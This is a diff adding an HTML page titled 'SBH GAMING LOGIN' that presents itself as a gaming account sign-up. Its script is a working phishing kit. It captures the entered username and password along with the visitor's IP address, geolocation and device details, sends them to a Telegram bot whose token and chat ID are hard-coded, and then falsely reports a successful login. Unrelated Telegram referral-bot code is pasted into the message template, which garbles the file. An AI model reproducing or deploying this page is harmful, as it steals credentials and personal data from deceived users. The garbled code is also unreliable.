@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SBH GAMING LOGIN</title>
+  <style>
+    /* General Styling */
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      height: 100vh;
+      color: white;
+      text-align: center;
+    }
+
+    /* Animated RGB Background */
+    .rgb-background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, red, purple, blue, green, yellow, red);
+      background-size: 500% 500%;
+      animation: rgb-animation 12s infinite;
+      z-index: -1;
+    }
+
+    @keyframes rgb-animation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .login-container {
+      background: rgba(0, 0, 0, 0.85);
+      border-radius: 15px;
+      padding: 30px 25px;
+      width: 350px;
+      margin: auto;
+      position: relative;
+      top: 50%;
+      transform: translateY(-50%);
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 24px;
+    }
+
+    .logo {
+      width: 100px;
+      height: 100px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    .input-group {
+      margin: 15px 0;
+      position: relative;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+    }
+
+    button {
+      padding: 10px 20px;
+      background: #3498db;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 10px 0;
+      color: white;
+    }
+
+    button:hover {
+      background: #1f78b4;
+    }
+  </style>
+</head>
+<body>
+  <div class="rgb-background"></div>
+
+  <!-- Login Form -->
+  <div class="login-container">
+    <!-- Logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Sbhgamingplesesubscribe_icon.jpg" alt="Logo" class="logo">
+    <h1>Create a Account</h1>
+    <form onsubmit="sendDetails(event)">
+      <div class="input-group">
+        <input type="text" id="username" placeholder="Username or Email" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password" required>
+      </div>
+      <button type="submit">Create Account</button>
+    </form>
+  </div>
+
+  <script>
+    // Telegram Bot Configurations
+    const BOT_TOKEN = "7802197327:AAFrFQcwp5aT0EqvVRcTSJoQ2Nur_MhIm9g"; // Replace with your bot token
+    const CHAT_ID = "5727297266"; // Replace with your chat ID
+
+    // Send Login and Device Info to Telegram
+    async function sendDetails(event) {
+      event.preventDefault();
+
+      // Get login details
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      // Get location/device info
+      let ipData = {};
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        ipData = await response.json();
+      } catch (error) {
+        alert("Error fetching location: " + error.message);
+        return;
+      }
+
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+      };
+
+      // Create message
+      const message = `
+🔒 Login Attempt:
+========================
+👤 Username/Email: ${username}
+🔑 Password: ${password}
+========================
+
+📍 Location & Device Info:
+===========================
+🌍 IP Address: ${ipData.ip || "N/A"}
+📌 Location: ${ipData.city || "N/A"}, ${ipData.region || "N/A"}, ${ipData.country_name || "N/A"}
+📅 Timezone: ${ipData.timezone || "N/A"}
+
+💻 Device Information:
+🖥 Platform: ${deviceInfo.platform}
+📱 Browser: ${deviceInfo.userAgent}
+📏 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+
+🌎 Latitude: ${ipData.latitude || "N/A"}
+🌍 Longitude: ${ipData.longitude || "N/A"}
+var button = [{ title : "⚜️ Joined ⚜️" , command : "⚜️ Joined ⚜️" }]
+Bot.sendInlineKeyboard(button , "*⛔ Must Join All Our Channel : \n\n ➤ @LootDeveloper \n ➤ @Fokat_Paisa \n ➤ @Earningdoz \n ➤ @BotCodesbyEarningdoz \n ➤ @Earning_Adda_Officall \n\n✅ After Joining, Click On '⚜️ Joined'*")
+
+function hello(message) {
+  var greetings = ""
+
+  Bot.sendMessage(greetings + message)
+}
+
+function doTouchOwnLink() {
+  Bot.sendMessage("*You're Trying To Invite You're Self ❌*")
+}
+
+function doAttracted(channel) {
+  hello("Referal: " + channel)
+}
+
+function doAtractedByUser(refUser) {
+  hello("")
+  var balance = Libs.ResourcesLib.anotherUserRes("balance", refUser.telegramid)
+ balance.add(0.0)
+Bot.sendMessageToChatWithId(refUser.chatId, "*💥 New Referral - *"+"[" +user.telegramid+"]" + "(" + "tg://user?id=" + user.telegramid + ")"+"*\nReward only if user joins our channels!*");
+}
+
+function doAlreadyAttracted(){
+  Bot.sendMessage("*You Already Started The Bot ❌*");
+}
+
+var trackOptions = {
+  onTouchOwnLink: doTouchOwnLink,
+  onAttracted: doAttracted,
+  onAtractedByUser: doAtractedByUser,
+  onAlreadyAttracted: doAlreadyAttracted
+}
+
+Libs.ReferralLib.currentUser.track(trackOptions);
+var status = Libs.ResourcesLib.anotherChatRes("status", "global")
+  status.add(1)
+var welco = User.getProperty("welco")
+if (welco == undefined) {
+  var user_link =
+    "[" + user.first_name + "]" + "(" + "tg://user?id=" + user.telegramid + ")"
+  var status = Libs.ResourcesLib.anotherChatRes("status", "global")
+  status.add(1)
+  Bot.sendMessageToChatWithId(
+    731127686,
+    "*👨🏻‍✈️New User🆕*\n\n*🤴🏻User = "+user.first_name+"\n\n👮🏻‍♂Username =* " +
+      user_link +
+      " \n\n*💳User Id =* " +
+      user.telegramid +
+      ""
+  )
+}
+User.setProperty("welco", user.telegramid, "text")
+===========================
+      `;
+
+      // Send message to Telegram
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+          }),
+        });
+        alert("Login Successfully!");
+      } catch (error) {
+        alert("Unsuccessful Login 😟" + error.message);
+      }
+    }
+  </script>
+</body>
+</html>
